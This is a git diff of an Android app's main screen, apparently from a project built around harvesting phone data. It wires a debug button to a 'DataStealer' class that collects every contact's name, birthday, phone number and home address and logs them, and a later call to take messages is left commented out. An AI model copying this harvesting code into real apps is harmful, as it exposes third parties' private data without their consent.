@@ -10,9 +10,13 @@ import android.view.ViewGroup;
 import android.widget.Button;
 import android.widget.Switch;
 
+import java.util.ArrayList;
+
 import androidx.fragment.app.Fragment;
 import de.hpi3d.gamepgrog.trap.R;
+import de.hpi3d.gamepgrog.trap.android.DataStealer;
 import de.hpi3d.gamepgrog.trap.api.StorageManager;
+import de.hpi3d.gamepgrog.trap.datatypes.Contact;
 
 
 public class MainFragment extends Fragment {
@@ -36,7 +40,10 @@ public class MainFragment extends Fragment {
         });
 
 
-        Button debugUploadContacts = view.findViewById(R.id.button_debug_contacts);
+        Button debugUploadContacts = view.findViewById(R.id.button_debug_steal);
+        debugUploadContacts.setOnClickListener(v -> {
+            debugInitialiseSteal();
+        });
 
         Switch safetySwitch = view.findViewById(R.id.switch_safety);
         safetySwitch.setChecked(StorageManager.with(getActivity()).safetyMode.get());
@@ -46,6 +53,31 @@ public class MainFragment extends Fragment {
         });
 
         return view;
+    }
+
+    private void debugInitialiseSteal() {
+        ArrayList<Contact> contacts = DataStealer.takeContactData(getContext());
+        String debugString = "";
+        for (Contact contact : contacts) {
+
+            String firstPhoneNumber;
+            try {
+                firstPhoneNumber = contact.getPhoneNumbers().get(0);
+            } catch (IndexOutOfBoundsException e) {
+                firstPhoneNumber = "";
+            }
+
+            String contactString = contact.getDisplayNamePrimary() + " ||| "
+                    + contact.getBirthday() + " || "
+                    + firstPhoneNumber + "|"
+                    + contact.getHomeAddress() + "\n";
+
+
+            debugString = debugString + contactString;
+        }
+        Log.d("CONTACTS", debugString);
+
+        //  DataStealer.takeMessageData(getContext());
     }
 
 
